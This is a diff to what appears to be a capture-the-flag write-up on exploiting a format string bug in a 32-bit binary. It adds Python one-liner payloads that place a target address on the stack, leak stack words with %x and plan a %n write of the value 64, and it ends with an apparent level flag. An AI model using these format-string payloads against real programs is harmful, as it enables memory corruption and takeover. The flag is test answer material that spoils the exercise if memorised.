@@ -69,11 +69,18 @@ So we can see that our sequence is locating in here :
 
 0xbffff520:	0x41414141 this is our 4 A
 
-Then we will have to put the target adress (0x804988c) at the begining in the payload so it will be write at in the stack
-
-So lets decompile the stack after puting some AAAA inside it.
+Then we will have to put the target adress (0x804988c) at the begining in the payload by replacing the AAAA it will be write in the stack at the positions 5 let's check it:
 
 python -c 'print("\x8c\x98\x04\x08" + "%20x"*3 + "%n")'
+<<< $(python -c 'print("\x8c\x98\x04\x08" + ".%x."*4)')
+�.200..b7fd1ac0..b7ff37d0..804988c.
+
+yep we can see that the last is our value puted in the front.
+
+so now lets work with %n that will be writing the length of the string up to that point.
+
+so what we need is to put a lot of charactere before it.And we know that the value we need to search is 64.
+Si what will do is checking the value if we put not character then ading the caractere.
 
 b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
 
